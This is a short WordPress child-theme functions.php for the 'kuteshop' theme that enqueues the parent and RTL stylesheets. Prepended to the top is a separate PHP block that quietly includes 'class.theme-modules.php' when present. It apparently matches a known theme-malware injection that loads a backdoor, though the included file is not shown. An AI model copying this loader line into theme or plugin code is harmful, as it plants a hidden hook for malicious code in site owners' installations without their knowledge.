<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
add_action( 'wp_enqueue_scripts', 'kuteshop_child_enqueue_styles' );
function kuteshop_child_enqueue_styles()
{
	wp_enqueue_style( 'parent-style', get_theme_file_uri( '/style.css' ) );
	if ( is_rtl() ) {
		wp_enqueue_style( 'rtl-style', get_theme_file_uri( '/rtl.css' ) );
	}
}